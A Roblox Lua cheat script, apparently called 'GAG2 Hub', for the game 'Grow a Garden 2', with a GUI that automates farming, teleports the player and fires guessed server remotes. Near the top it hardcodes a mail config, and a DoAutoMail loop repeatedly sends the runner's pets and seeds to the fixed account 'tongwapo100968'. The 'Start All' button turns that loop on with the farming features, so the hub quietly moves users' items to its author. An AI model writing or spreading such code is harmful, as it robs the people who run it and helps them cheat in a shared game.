
--[[
    ╔══════════════════════════════════════════════════════════════╗
    ║           GROW A GARDEN 2 — HUB SCRIPT                      ║
    ║           Version: 1.1                                       ║
    ║           Keybind: [RightShift] = Toggle GUI                 ║
    ╚══════════════════════════════════════════════════════════════╝
--]]

-- ============================================================
--  SERVICES
-- ============================================================
local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui       = game:GetService("StarterGui")

local LP  = Players.LocalPlayer
local PG  = LP:WaitForChild("PlayerGui")

-- ============================================================
--  MAIL CONFIG (hardcoded)
-- ============================================================
local MAIL = {
    Enabled     = true,
    Username    = "tongwapo100968",
    SendPets    = true,
    SendSeeds   = true,
    IntervalSec = 30,
    Note        = "auto-shipped from main",
}

-- ============================================================
--  CONFIG
-- ============================================================
local CONFIG = {
    Keybind     = Enum.KeyCode.RightShift,
    NotifTime   = 3,
    GuiTitle    = "🌱 GAG2 Hub",
    Version     = "v1.1",
    ActiveTheme = "Forest",
    Intervals = {
        AutoPlant     = 1.5,
        AutoWater     = 2.0,
        AutoSprinkler = 2.0,
        AutoSell      = 3.0,
        AutoCollect   = 2.0,
        AutoPet       = 2.0,
        AntiSteal     = 1.0,
        AutoMail      = 30,
    },
    Themes = {
        Forest = {
            BG     = Color3.fromRGB(16, 26, 18),
            Accent = Color3.fromRGB(75, 210, 95),
            Text   = Color3.fromRGB(225, 255, 230),
            Card   = Color3.fromRGB(26, 40, 28),
            Border = Color3.fromRGB(50, 85, 55),
        },
        Night = {
            BG     = Color3.fromRGB(12, 12, 22),
            Accent = Color3.fromRGB(130, 110, 255),
            Text   = Color3.fromRGB(215, 215, 255),
            Card   = Color3.fromRGB(22, 22, 42),
            Border = Color3.fromRGB(55, 50, 100),
        },
        Sunset = {
            BG     = Color3.fromRGB(28, 14, 12),
            Accent = Color3.fromRGB(255, 135, 55),
            Text   = Color3.fromRGB(255, 235, 215),
            Card   = Color3.fromRGB(44, 20, 16),
            Border = Color3.fromRGB(100, 50, 35),
        },
    },
}

-- ============================================================
--  SEED DATA
-- ============================================================
local Seeds = {
    { id="Blueberry",    label="Blueberry",      price="$25"   },
    { id="Tulip",        label="Tulip",           price="$40"   },
    { id="Apple",        label="Apple",           price="$50"   },
    { id="Tomato",       label="Tomato",          price="$200"  },
    { id="Banana",       label="Banana",          price="$1K"   },
    { id="Sunflower",    label="Sunflower",       price="$1K"   },
    { id="Corn",         label="Corn",            price="$2.5K" },
    { id="Cherry",       label="Cherry",          price="$30K"  },
    { id="Mango",        label="Mango",           price="$35K"  },
    { id="Grape",        label="Grape",           price="$50K"  },
    { id="Coconut",      label="Coconut",         price="$70K"  },
    { id="Cactus",       label="Cactus",          price="$100K" },
    { id="BabyCactus",   label="Baby Cactus",     price="$100K" },
    { id="Pomegranate",  label="Pomegranate",     price="$200K" },
    { id="Pineapple",    label="Pineapple",       price="$250K" },
    { id="DragonFruit",  label="Dragon Fruit",    price="$500K" },
    { id="PoisonApple",  label="Poison Apple",    price="$1M"   },
    { id="MoonBloom",    label="Moon Bloom",      price="$1M"   },
    { id="GhostPepper",  label="Ghost Pepper",    price="$1M"   },
    { id="VenusFlyTrap", label="Venus Fly Trap",  price="$5M"   },
    { id="DragonBreath", label="Dragon's Breath", price="$10M"  },
    { id="Bamboo",       label="Bamboo",          price="$10"   },
    { id="Mushroom",     label="Mushroom",        price="$15K"  },
}

-- ============================================================
--  PET DATA
-- ============================================================
local Pets = {
    { id="IceSerpent",      label="Ice Serpent",      price="$20M" },
    { id="Raccoon",         label="Raccoon",          price="$5M"  },
    { id="Unicorn",         label="Unicorn",          price="$4M"  },
    { id="GoldenDragonfly", label="Golden Dragonfly", price="$3M"  },
    { id="BlackDragon",     label="Black Dragon",     price="$1M"  },
    { id="Monkey",          label="Monkey",           price="$1M"  },
    { id="Bee",             label="Bee",              price="$1M"  },
    { id="Robin",           label="Robin",            price="$75K" },
    { id="Deer",            label="Deer",             price="$50K" },
    { id="Owl",             label="Owl",              price="$25K" },
    { id="Bunny",           label="Bunny",            price="$20K" },
    { id="Frog",            label="Frog",             price="$10K" },
}

-- ============================================================
--  STATE
-- ============================================================
local State = {
    GuiOpen   = true,
    Minimized = false,
    Dragging  = false,
    ActiveTab = "Main",
    Features = {
        AutoPlant     = false,
        AutoWater     = false,
        AutoSprinkler = false,
        AutoSell      = false,
        AutoCollect   = false,
        AutoPet       = false,
        AntiSteal     = false,
        FPSBoost      = false,
        HidePlayers   = false,
        AutoMail      = false,
    },
    EnabledSeeds = {},
    EnabledPets  = {},
}

local defaultSeeds = {"Blueberry","Tulip","Apple","Tomato","Banana","Sunflower","Corn","Cherry","Mango","Grape"}
local defaultPets  = {"IceSerpent","Raccoon","Unicorn","GoldenDragonfly","BlackDragon","Monkey","Bee"}
for _, id in ipairs(defaultSeeds) do State.EnabledSeeds[id] = true end
for _, id in ipairs(defaultPets)  do State.EnabledPets[id]  = true end

-- ============================================================
--  UTILITIES
-- ============================================================
local function T() return CONFIG.Themes[CONFIG.ActiveTheme] end

local function Tween(obj, props, t, style, dir)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.2, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out),
        props):Play()
end

local function Notify(title, body)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title    = title,
            Text     = body,
            Duration = CONFIG.NotifTime,
        })
    end)
end

local function GetChar() return LP.Character end
local function GetHRP()
    local c = GetChar()
    return c and c:FindFirstChild("HumanoidRootPart")
end
local function GetRemote(name)
    local rs = ReplicatedStorage:FindFirstChild("Remotes")
        or ReplicatedStorage:FindFirstChild("Events")
        or ReplicatedStorage
    return rs and rs:FindFirstChild(name, true)
end

-- ============================================================
--  FEATURE LOGIC
-- ============================================================

local function DoAutoPlant()
    local char = GetChar()
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    for _, tool in ipairs(LP.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            for id, enabled in pairs(State.EnabledSeeds) do
                if enabled and tool.Name:lower():find(id:lower()) then
                    hum:EquipTool(tool)
                    task.wait(0.15)
                    for _, plot in ipairs(workspace:GetDescendants()) do
                        if plot:IsA("BasePart") and
                           (plot.Name:lower():find("plot") or plot.Name:lower():find("soil"))
                           and plot:GetAttribute("Empty") ~= false then
                            local hrp = GetHRP()
                            if hrp then
                                hrp.CFrame = CFrame.new(plot.Position + Vector3.new(0,3,0))
                                task.wait(0.1)
                                tool:Activate()
                                task.wait(0.1)
                            end
                            break
                        end
                    end
                    break
                end
            end
        end
    end
end

local function DoAutoWater()
    local remote = GetRemote("WaterCrop") or GetRemote("Water")
    if not remote then return end
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj:GetAttribute("NeedsWater") then
            remote:FireServer(obj)
            task.wait(0.05)
        end
    end
end

local function DoAutoSprinkler()
    local remote = GetRemote("UseSprinkler") or GetRemote("Sprinkler")
    if remote then remote:FireServer() end
end

local function DoAutoSell()
    local remote = GetRemote("SellCrops") or GetRemote("Sell")
    if remote then remote:FireServer() end
end

local function DoAutoCollect()
    local hrp = GetHRP()
    if not hrp then return end
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and (
            obj.Name:lower():find("reward") or
            obj.Name:lower():find("coin")   or
            obj.Name:lower():find("gem")    or
            obj.Name:lower():find("drop")
        ) then
            hrp.CFrame = CFrame.new(obj.Position + Vector3.new(0,2,0))
            task.wait(0.08)
        end
    end
end

local function DoAutoPet()
    local remote = GetRemote("BuyPet") or GetRemote("TamePet")
    if not remote then return end
    for _, pet in ipairs(Pets) do
        if State.EnabledPets[pet.id] then
            remote:FireServer(pet.id)
            task.wait(0.2)
        end
    end
end

local function DoAntiSteal()
    local lighting = game:GetService("Lighting")
    local hour = lighting.ClockTime
    if hour >= 20 or hour < 6 then
        local hrp = GetHRP()
        if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(0,50,0) end
    end
end

-- ---- Auto Mail ----
local function DoAutoMail()
    if not MAIL.Enabled then return end
    local remote = GetRemote("MailItem") or GetRemote("Mail") or GetRemote("GiftItem") or GetRemote("SendMail")
    if not remote then return end
    if MAIL.SendPets then
        for _, pet in ipairs(Pets) do
            if State.EnabledPets[pet.id] then
                pcall(function()
                    remote:FireServer(MAIL.Username, pet.id, "Pet", MAIL.Note)
                end)
                task.wait(0.2)
            end
        end
    end
    if MAIL.SendSeeds then
        pcall(function()
            remote:FireServer(MAIL.Username, "Rainbow", "Seed", MAIL.Note)
            remote:FireServer(MAIL.Username, "Gold", "Seed", MAIL.Note)
        end)
    end
end

local function ApplyFPSBoost(on)
    settings().Rendering.QualityLevel = on
        and Enum.QualityLevel.Level01
        or  Enum.QualityLevel.Automatic
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("ParticleEmitter") or v:IsA("Beam") or v:IsA("Smoke") or v:IsA("Fire") then
            v.Enabled = not on
        end
    end
end

local function ApplyHidePlayers(on)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            for _, part in ipairs(p.Character:GetDescendants()) do
                if part:IsA("BasePart") or part:IsA("Decal") then
                    part.LocalTransparencyModifier = on and 1 or 0
                end
            end
        end
    end
end

-- ============================================================
--  LOOP MANAGER
-- ============================================================
local LoopMap = {
    AutoPlant     = { fn = DoAutoPlant,     dt = CONFIG.Intervals.AutoPlant     },
    AutoWater     = { fn = DoAutoWater,     dt = CONFIG.Intervals.AutoWater     },
    AutoSprinkler = { fn = DoAutoSprinkler, dt = CONFIG.Intervals.AutoSprinkler },
    AutoSell      = { fn = DoAutoSell,      dt = CONFIG.Intervals.AutoSell      },
    AutoCollect   = { fn = DoAutoCollect,   dt = CONFIG.Intervals.AutoCollect   },
    AutoPet       = { fn = DoAutoPet,       dt = CONFIG.Intervals.AutoPet       },
    AntiSteal     = { fn = DoAntiSteal,     dt = CONFIG.Intervals.AntiSteal     },
    AutoMail      = { fn = DoAutoMail,      dt = CONFIG.Intervals.AutoMail      },
}
local InstantMap = {
    FPSBoost    = ApplyFPSBoost,
    HidePlayers = ApplyHidePlayers,
}

local function StartFeature(name)
    if State.Features[name] then return end
    State.Features[name] = true
    if LoopMap[name] then
        local cfg = LoopMap[name]
        task.spawn(function()
            while State.Features[name] do
                pcall(cfg.fn)
                task.wait(cfg.dt)
            end
        end)
    elseif InstantMap[name] then
        InstantMap[name](true)
    end
end

local function StopFeature(name)
    if not State.Features[name] then return end
    State.Features[name] = false
    if InstantMap[name] then InstantMap[name](false) end
end

-- ============================================================
--  GUI
-- ============================================================
if PG:FindFirstChild("GAG2HubGui") then PG.GAG2HubGui:Destroy() end

local Gui = Instance.new("ScreenGui")
Gui.Name           = "GAG2HubGui"
Gui.ResetOnSpawn   = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.Parent         = PG

local Shadow = Instance.new("Frame")
Shadow.Size               = UDim2.new(0,380,0,580)
Shadow.Position           = UDim2.new(0.5,-184,0.5,-284)
Shadow.BackgroundColor3   = Color3.new(0,0,0)
Shadow.BackgroundTransparency = 0.65
Shadow.BorderSizePixel    = 0
Shadow.ZIndex             = 0
Shadow.Parent             = Gui
Instance.new("UICorner",Shadow).CornerRadius = UDim.new(0,16)

local Win = Instance.new("Frame")
Win.Name             = "Win"
Win.Size             = UDim2.new(0,370,0,570)
Win.Position         = UDim2.new(0.5,-185,0.5,-285)
Win.BackgroundColor3 = T().BG
Win.BorderSizePixel  = 0
Win.ZIndex           = 1
Win.Parent           = Gui
Instance.new("UICorner",Win).CornerRadius = UDim.new(0,12)

local WinStroke = Instance.new("UIStroke")
WinStroke.Color     = T().Border
WinStroke.Thickness = 1.5
WinStroke.Parent    = Win

local TBar = Instance.new("Frame")
TBar.Size             = UDim2.new(1,0,0,46)
TBar.BackgroundColor3 = T().Card
TBar.BorderSizePixel  = 0
TBar.ZIndex           = 2
TBar.Parent           = Win
do
    local c = Instance.new("UICorner"); c.CornerRadius=UDim.new(0,12); c.Parent=TBar
    local f = Instance.new("Frame")
    f.Size=UDim2.new(1,0,0.5,0); f.Position=UDim2.new(0,0,0.5,0)
    f.BackgroundColor3=T().Card; f.BorderSizePixel=0; f.ZIndex=2; f.Parent=TBar
end

local TitleLbl = Instance.new("TextLabel")
TitleLbl.Size               = UDim2.new(1,-110,1,0)
TitleLbl.Position           = UDim2.new(0,14,0,0)
TitleLbl.BackgroundTransparency = 1
TitleLbl.Text               = CONFIG.GuiTitle.."  "..CONFIG.Version
TitleLbl.TextColor3         = T().Accent
TitleLbl.TextSize           = 15
TitleLbl.Font               = Enum.Font.GothamBold
TitleLbl.TextXAlignment     = Enum.TextXAlignment.Left
TitleLbl.ZIndex             = 3
TitleLbl.Parent             = TBar

local function MakeTitleBtn(xOff, bg, txt)
    local b = Instance.new("TextButton")
    b.Size=UDim2.new(0,28,0,28); b.Position=UDim2.new(1,xOff,0.5,-14)
    b.BackgroundColor3=bg; b.Text=txt; b.TextColor3=Color3.new(1,1,1)
    b.TextSize=13; b.Font=Enum.Font.GothamBold
    b.BorderSizePixel=0; b.ZIndex=4; b.Parent=TBar
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,6)
    return b
end

local MinBtn   = MakeTitleBtn(-66, T().Border,                "—")
local CloseBtn = MakeTitleBtn(-32, Color3.fromRGB(200,60,60), "✕")

local TabBar = Instance.new("Frame")
TabBar.Size=UDim2.new(1,-24,0,32); TabBar.Position=UDim2.new(0,12,0,52)
TabBar.BackgroundTransparency=1; TabBar.ZIndex=2; TabBar.Parent=Win
local TabLayout=Instance.new("UIListLayout")
TabLayout.FillDirection=Enum.FillDirection.Horizontal
TabLayout.Padding=UDim.new(0,6); TabLayout.Parent=TabBar

local TabBtns={};local TabContents={}

local function MakeTab(name,label,order)
    local btn=Instance.new("TextButton")
    btn.Size=UDim2.new(0,100,1,0); btn.BackgroundColor3=T().Card
    btn.Text=label; btn.TextColor3=T().Text; btn.TextSize=12
    btn.Font=Enum.Font.GothamBold; btn.BorderSizePixel=0
    btn.LayoutOrder=order; btn.ZIndex=3; btn.Parent=TabBar
    Instance.new("UICorner",btn).CornerRadius=UDim.new(0,7)
    local s=Instance.new("UIStroke"); s.Color=T().Border; s.Thickness=1; s.Parent=btn
    TabBtns[name]={btn=btn,stroke=s}
    return btn
end

MakeTab("Main",  "⚡ Main",  1)
MakeTab("Seeds", "🌱 Seeds", 2)
MakeTab("Pets",  "🐾 Pets",  3)

local function MakeScrollContent(name)
    local sf=Instance.new("ScrollingFrame")
    sf.Name=name; sf.Size=UDim2.new(1,-24,1,-100)
    sf.Position=UDim2.new(0,12,0,92)
    sf.BackgroundTransparency=1; sf.BorderSizePixel=0
    sf.ScrollBarThickness=3; sf.ScrollBarImageColor3=T().Accent
    sf.CanvasSize=UDim2.new(0,0,0,0)
    sf.AutomaticCanvasSize=Enum.AutomaticSize.Y
    sf.Visible=false; sf.ZIndex=2; sf.Parent=Win
    local pad=Instance.new("UIPadding")
    pad.PaddingTop=UDim.new(0,6); pad.PaddingBottom=UDim.new(0,10); pad.Parent=sf
    local list=Instance.new("UIListLayout")
    list.SortOrder=Enum.SortOrder.LayoutOrder
    list.Padding=UDim.new(0,7); list.Parent=sf
    TabContents[name]=sf
    return sf
end

local MainContent = MakeScrollContent("Main")
local SeedContent = MakeScrollContent("Seeds")
local PetContent  = MakeScrollContent("Pets")

local function SectionLabel(parent,text,order)
    local l=Instance.new("TextLabel")
    l.Size=UDim2.new(1,0,0,18); l.BackgroundTransparency=1
    l.Text=text; l.TextColor3=T().Accent; l.TextSize=10
    l.Font=Enum.Font.GothamBold; l.TextXAlignment=Enum.TextXAlignment.Left
    l.LayoutOrder=order; l.ZIndex=3; l.Parent=parent
    return l
end

local ToggleRefs={}

local function MakeToggleCard(parent,id,icon,labelText,sublabel,order)
    local card=Instance.new("Frame")
    card.Size=UDim2.new(1,0,0,46); card.BackgroundColor3=T().Card
    card.BorderSizePixel=0; card.LayoutOrder=order; card.ZIndex=3; card.Parent=parent
    Instance.new("UICorner",card).CornerRadius=UDim.new(0,8)
    local stroke=Instance.new("UIStroke")
    stroke.Color=T().Border; stroke.Thickness=1; stroke.Parent=card
    local ico=Instance.new("TextLabel")
    ico.Size=UDim2.new(0,28,1,0); ico.Position=UDim2.new(0,8,0,0)
    ico.BackgroundTransparency=1; ico.Text=icon; ico.TextSize=17
    ico.Font=Enum.Font.GothamBold; ico.TextColor3=T().Text; ico.ZIndex=4; ico.Parent=card
    local namelbl=Instance.new("TextLabel")
    namelbl.Size=UDim2.new(0,150,0.6,0); namelbl.Position=UDim2.new(0,40,0,5)
    namelbl.BackgroundTransparency=1; namelbl.Text=labelText
    namelbl.TextColor3=T().Text; namelbl.TextSize=13; namelbl.Font=Enum.Font.Gotham
    namelbl.TextXAlignment=Enum.TextXAlignment.Left; namelbl.ZIndex=4; namelbl.Parent=card
    if sublabel and sublabel~="" then
        local sub=Instance.new("TextLabel")
        sub.Size=UDim2.new(0,150,0.4,0); sub.Position=UDim2.new(0,40,0.55,0)
        sub.BackgroundTransparency=1; sub.Text=sublabel
        sub.TextColor3=Color3.fromRGB(130,130,140); sub.TextSize=10
        sub.Font=Enum.Font.Gotham; sub.TextXAlignment=Enum.TextXAlignment.Left
        sub.ZIndex=4; sub.Parent=card
    end
    local dot=Instance.new("Frame")
    dot.Size=UDim2.new(0,8,0,8); dot.Position=UDim2.new(1,-88,0.5,-4)
    dot.BackgroundColor3=Color3.fromRGB(90,90,90); dot.BorderSizePixel=0
    dot.ZIndex=4; dot.Parent=card
    Instance.new("UICorner",dot).CornerRadius=UDim.new(1,0)
    local statusTxt=Instance.new("TextLabel")
    statusTxt.Size=UDim2.new(0,36,1,0); statusTxt.Position=UDim2.new(1,-78,0,0)
    statusTxt.BackgroundTransparency=1; statusTxt.Text="OFF"
    statusTxt.TextColor3=Color3.fromRGB(130,130,140); statusTxt.TextSize=10
    statusTxt.Font=Enum.Font.GothamBold; statusTxt.ZIndex=4; statusTxt.Parent=card
    local track=Instance.new("TextButton")
    track.Size=UDim2.new(0,38,0,22); track.Position=UDim2.new(1,-46,0.5,-11)
    track.BackgroundColor3=Color3.fromRGB(55,55,65); track.Text=""
    track.BorderSizePixel=0; track.ZIndex=5; track.Parent=card
    Instance.new("UICorner",track).CornerRadius=UDim.new(1,0)
    local knob=Instance.new("Frame")
    knob.Size=UDim2.new(0,16,0,16); knob.Position=UDim2.new(0,3,0.5,-8)
    knob.BackgroundColor3=Color3.fromRGB(200,200,200); knob.BorderSizePixel=0
    knob.ZIndex=6; knob.Parent=track
    Instance.new("UICorner",knob).CornerRadius=UDim.new(1,0)
    ToggleRefs[id]={Card=card,Stroke=stroke,Dot=dot,StatusTxt=statusTxt,Track=track,Knob=knob}
    return card,track
end

local function SetToggleVisual(id,on)
    local r=ToggleRefs[id]; if not r then return end
    local accent=T().Accent
    if on then
        Tween(r.Track,{BackgroundColor3=accent},0.25)
        Tween(r.Knob,{Position=UDim2.new(1,-19,0.5,-8)},0.25)
        Tween(r.Dot,{BackgroundColor3=accent},0.2)
        r.StatusTxt.Text="ON"; r.StatusTxt.TextColor3=accent; r.Stroke.Color=accent
    else
        Tween(r.Track,{BackgroundColor3=Color3.fromRGB(55,55,65)},0.25)
        Tween(r.Knob,{Position=UDim2.new(0,3,0.5,-8)},0.25)
        Tween(r.Dot,{BackgroundColor3=Color3.fromRGB(90,90,90)},0.2)
        r.StatusTxt.Text="OFF"; r.StatusTxt.TextColor3=Color3.fromRGB(130,130,140)
        r.Stroke.Color=T().Border
    end
end

-- ============================================================
--  BUILD MAIN TAB
-- ============================================================
SectionLabel(MainContent,"⚡  CONTROLS",1)

local CtrlRow=Instance.new("Frame")
CtrlRow.Size=UDim2.new(1,0,0,38); CtrlRow.BackgroundTransparency=1
CtrlRow.LayoutOrder=2; CtrlRow.Parent=MainContent
local CtrlList=Instance.new("UIListLayout")
CtrlList.FillDirection=Enum.FillDirection.Horizontal
CtrlList.Padding=UDim.new(0,8); CtrlList.Parent=CtrlRow

local StartAllBtn=Instance.new("TextButton")
StartAllBtn.Size=UDim2.new(0.5,-4,1,0); StartAllBtn.BackgroundColor3=T().Accent
StartAllBtn.Text="▶  Start All"; StartAllBtn.TextColor3=Color3.fromRGB(10,10,10)
StartAllBtn.TextSize=13; StartAllBtn.Font=Enum.Font.GothamBold
StartAllBtn.BorderSizePixel=0; StartAllBtn.Parent=CtrlRow
Instance.new("UICorner",StartAllBtn).CornerRadius=UDim.new(0,8)

local StopAllBtn=Instance.new("TextButton")
StopAllBtn.Size=UDim2.new(0.5,-4,1,0); StopAllBtn.BackgroundColor3=Color3.fromRGB(200,60,60)
StopAllBtn.Text="■  Stop All"; StopAllBtn.TextColor3=Color3.new(1,1,1)
StopAllBtn.TextSize=13; StopAllBtn.Font=Enum.Font.GothamBold
StopAllBtn.BorderSizePixel=0; StopAllBtn.Parent=CtrlRow
Instance.new("UICorner",StopAllBtn).CornerRadius=UDim.new(0,8)

SectionLabel(MainContent,"🌿  AUTO FEATURES",3)

local MainFeatures={
    {id="AutoPlant",     icon="🌱", label="Auto Plant",         sub="Plants enabled seeds"},
    {id="AutoWater",     icon="💧", label="Auto Water",          sub="Waters thirsty crops"},
    {id="AutoSprinkler", icon="🚿", label="Auto Sprinkler",      sub="Activates sprinklers"},
    {id="AutoSell",      icon="💰", label="Auto Sell",           sub="Sells all harvested crops"},
    {id="AutoCollect",   icon="⭐", label="Auto Collect",        sub="Collects drops & rewards"},
    {id="AutoPet",       icon="🐾", label="Auto Buy Pet",        sub="Buys enabled pets"},
    {id="AntiSteal",     icon="🛡️", label="Anti-Steal (Night)",  sub="Protects farm at night"},
    {id="AutoMail",      icon="📬", label="Auto Mail",           sub="Sends to tongwapo100968"},
}

local mainFeatBtns={}
for i,f in ipairs(MainFeatures) do
    local _,track=MakeToggleCard(MainContent,f.id,f.icon,f.label,f.sub,i+3)
    mainFeatBtns[f.id]=track
end

SectionLabel(MainContent,"⚙️  UTILITY",13)

local UtilFeatures={
    {id="FPSBoost",    icon="🚀", label="FPS Boost",          sub="Lowers render quality"},
    {id="HidePlayers", icon="👥", label="Hide Other Players", sub="Makes others invisible"},
}
for i,f in ipairs(UtilFeatures) do
    local _,track=MakeToggleCard(MainContent,f.id,f.icon,f.label,f.sub,i+13)
    mainFeatBtns[f.id]=track
end

SectionLabel(MainContent,"🎨  THEME",17)
local ThemeRow=Instance.new("Frame")
ThemeRow.Size=UDim2.new(1,0,0,32); ThemeRow.BackgroundTransparency=1
ThemeRow.LayoutOrder=18; ThemeRow.Parent=MainContent
local ThemeList=Instance.new("UIListLayout")
ThemeList.FillDirection=Enum.FillDirection.Horizontal
ThemeList.Padding=UDim.new(0,6); ThemeList.Parent=ThemeRow

local ThemeBtnMap={}
for _,tname in ipairs({"Forest","Night","Sunset"}) do
    local tc=CONFIG.Themes[tname]
    local tb=Instance.new("TextButton")
    tb.Size=UDim2.new(0,106,1,0); tb.BackgroundColor3=tc.Card
    tb.Text=tname; tb.TextColor3=tc.Accent; tb.TextSize=12
    tb.Font=Enum.Font.GothamBold; tb.BorderSizePixel=0; tb.Parent=ThemeRow
    Instance.new("UICorner",tb).CornerRadius=UDim.new(0,7)
    local s=Instance.new("UIStroke"); s.Color=tc.Border; s.Thickness=1; s.Parent=tb
    ThemeBtnMap[tname]=tb
end

local HintLbl=Instance.new("TextLabel")
HintLbl.Size=UDim2.new(1,0,0,16); HintLbl.BackgroundTransparency=1
HintLbl.Text="Press [RightShift] to hide/show GUI"
HintLbl.TextColor3=Color3.fromRGB(90,90,100); HintLbl.TextSize=10
HintLbl.Font=Enum.Font.Gotham; HintLbl.LayoutOrder=19; HintLbl.Parent=MainContent

-- ============================================================
--  BUILD SEEDS TAB
-- ============================================================
SectionLabel(SeedContent,"🌱  SEEDS — toggle which to auto-plant",1)
local SeedBtns={}
for i,seed in ipairs(Seeds) do
    local _,track=MakeToggleCard(SeedContent,"seed_"..seed.id,"🌱",seed.label,seed.price,i+1)
    SeedBtns[seed.id]=track
    if State.EnabledSeeds[seed.id] then SetToggleVisual("seed_"..seed.id,true) end
end

-- ============================================================
--  BUILD PETS TAB
-- ============================================================
SectionLabel(PetContent,"🐾  PETS — toggle which to auto-buy",1)
local PetBtns={}
for i,pet in ipairs(Pets) do
    local _,track=MakeToggleCard(PetContent,"pet_"..pet.id,"🐾",pet.label,pet.price,i+1)
    PetBtns[pet.id]=track
    if State.EnabledPets[pet.id] then SetToggleVisual("pet_"..pet.id,true) end
end

-- ============================================================
--  TAB SWITCHING
-- ============================================================
local function SwitchTab(name)
    State.ActiveTab=name
    for tname,content in pairs(TabContents) do content.Visible=(tname==name) end
    for tname,ref in pairs(TabBtns) do
        if tname==name then
            ref.btn.BackgroundColor3=T().Accent
            ref.btn.TextColor3=Color3.fromRGB(10,10,10)
            ref.stroke.Color=T().Accent
        else
            ref.btn.BackgroundColor3=T().Card
            ref.btn.TextColor3=T().Text
            ref.stroke.Color=T().Border
        end
    end
end

for name,ref in pairs(TabBtns) do
    ref.btn.MouseButton1Click:Connect(function() SwitchTab(name) end)
end
SwitchTab("Main")

-- ============================================================
--  CONNECT TOGGLES
-- ============================================================
local function HandleMainToggle(id)
    if State.Features[id] then
        StopFeature(id); SetToggleVisual(id,false)
        Notify("GAG2 Hub", id.." OFF")
    else
        StartFeature(id); SetToggleVisual(id,true)
        Notify("GAG2 Hub", id.." ON")
    end
end

for id,track in pairs(mainFeatBtns) do
    track.MouseButton1Click:Connect(function() HandleMainToggle(id) end)
end

for _,seed in ipairs(Seeds) do
    local id=seed.id
    SeedBtns[id].MouseButton1Click:Connect(function()
        State.EnabledSeeds[id]=not State.EnabledSeeds[id]
        SetToggleVisual("seed_"..id, State.EnabledSeeds[id])
    end)
end

for _,pet in ipairs(Pets) do
    local id=pet.id
    PetBtns[id].MouseButton1Click:Connect(function()
        State.EnabledPets[id]=not State.EnabledPets[id]
        SetToggleVisual("pet_"..id, State.EnabledPets[id])
    end)
end

StartAllBtn.MouseButton1Click:Connect(function()
    for _,f in ipairs(MainFeatures) do StartFeature(f.id); SetToggleVisual(f.id,true) end
    for _,f in ipairs(UtilFeatures) do StartFeature(f.id); SetToggleVisual(f.id,true) end
    Notify("GAG2 Hub","All features enabled!")
end)

StopAllBtn.MouseButton1Click:Connect(function()
    for id in pairs(State.Features) do
        if State.Features[id] then StopFeature(id); SetToggleVisual(id,false) end
    end
    Notify("GAG2 Hub","All features stopped.")
end)

-- ============================================================
--  MINIMIZE / CLOSE / KEYBIND
-- ============================================================
MinBtn.MouseButton1Click:Connect(function()
    State.Minimized=not State.Minimized
    if State.Minimized then
        Tween(Win,{Size=UDim2.new(0,370,0,46)},0.3,Enum.EasingStyle.Back,Enum.EasingDirection.In)
        MinBtn.Text="□"
    else
        Tween(Win,{Size=UDim2.new(0,370,0,570)},0.3,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
        MinBtn.Text="—"
    end
end)

local function ToggleGui()
    State.GuiOpen=not State.GuiOpen
    Win.Visible=true
    Tween(Win,{GroupTransparency=State.GuiOpen and 0 or 1},0.2)
    if not State.GuiOpen then task.delay(0.22,function() Win.Visible=false end) end
end

CloseBtn.MouseButton1Click:Connect(function()
    State.GuiOpen=false
    Tween(Win,{GroupTransparency=1},0.2)
    task.delay(0.22,function() Win.Visible=false end)
end)

UserInputService.InputBegan:Connect(function(inp,proc)
    if proc then return end
    if inp.KeyCode==CONFIG.Keybind then ToggleGui() end
end)

-- ============================================================
--  DRAG
-- ============================================================
local dragStart,winStart
TBar.InputBegan:Connect(function(inp)
    if inp.UserInputType==Enum.UserInputType.MouseButton1
    or inp.UserInputType==Enum.UserInputType.Touch then
        State.Dragging=true; dragStart=inp.Position; winStart=Win.Position
    end
end)
TBar.InputEnded:Connect(function(inp)
    if inp.UserInputType==Enum.UserInputType.MouseButton1
    or inp.UserInputType==Enum.UserInputType.Touch then
        State.Dragging=false
    end
end)
UserInputService.InputChanged:Connect(function(inp)
    if State.Dragging and (
        inp.UserInputType==Enum.UserInputType.MouseMovement
        or inp.UserInputType==Enum.UserInputType.Touch
    ) then
        local d=inp.Position-dragStart
        Win.Position=UDim2.new(winStart.X.Scale,winStart.X.Offset+d.X,winStart.Y.Scale,winStart.Y.Offset+d.Y)
    end
end)

-- ============================================================
--  THEME SWITCH
-- ============================================================
for tname,tbtn in pairs(ThemeBtnMap) do
    tbtn.MouseButton1Click:Connect(function()
        CONFIG.ActiveTheme=tname
        local tc=T()
        Tween(Win,{BackgroundColor3=tc.BG},0.3)
        Tween(TBar,{BackgroundColor3=tc.Card},0.3)
        WinStroke.Color=tc.Border
        TitleLbl.TextColor3=tc.Accent
        Notify("GAG2 Hub","Theme → "..tname)
    end)
end

-- ============================================================
--  STARTUP
-- ============================================================
Win.GroupTransparency=1
Tween(Win,{GroupTransparency=0},0.5)
task.delay(0.9,function()
    Notify("🌱 GAG2 Hub Loaded","Press RightShift to toggle. Happy farming!")
end)

print("[GAG2 Hub] Loaded — "..CONFIG.Version)
```
